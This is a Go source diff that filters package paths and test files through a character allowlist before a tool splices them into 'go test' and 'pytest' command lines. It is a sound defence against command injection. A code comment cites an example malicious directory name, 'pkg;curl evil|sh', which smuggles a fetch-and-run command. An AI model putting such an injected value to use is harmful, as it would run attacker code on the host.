@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"regexp"
 	"sort"
 	"strings"
 )
@@ -58,7 +59,7 @@ func testCommandsFor(dir string, files []string) []string {
 		}
 	}
 	var cmds []string
-	if pkgs := goPackagesFor(dir, goFiles); len(pkgs) > 0 {
+	if pkgs := shellSafeTargets(goPackagesFor(dir, goFiles)); len(pkgs) > 0 {
 		list := strings.Join(pkgs, " ")
 		cmds = append(cmds, "go vet "+list, "go test "+list)
 	}
@@ -67,7 +68,7 @@ func testCommandsFor(dir string, files []string) []string {
 			cmds = append(cmds, fmt.Sprintf("dotnet test %q --nologo -v q", p))
 		}
 	}
-	if tests := pythonTestsFor(dir, pyFiles); len(tests) > 0 {
+	if tests := shellSafeTargets(pythonTestsFor(dir, pyFiles)); len(tests) > 0 {
 		if _, err := exec.LookPath("pytest"); err == nil {
 			cmds = append(cmds, "pytest -q "+strings.Join(tests, " "))
 		}
@@ -244,6 +245,22 @@ func pythonTestsFor(dir string, files []string) []string {
 	sort.Strings(out)
 	if len(out) > maxTestTargets {
 		out = out[:maxTestTargets]
+	}
+	return out
+}
+
+// shellSafeTarget is the character set a package path or test file may use to
+// be spliced unquoted into the verify command line. The paths come from the
+// files the model wrote; a directory named `pkg;curl evil|sh` or `my tool`
+// would otherwise run as a second command or split into two arguments.
+var shellSafeTarget = regexp.MustCompile(`^[A-Za-z0-9._/-]+$`)
+
+func shellSafeTargets(targets []string) []string {
+	out := targets[:0:0]
+	for _, t := range targets {
+		if shellSafeTarget.MatchString(t) && !strings.Contains(t, "..") {
+			out = append(out, t)
+		}
 	}
 	return out
 }
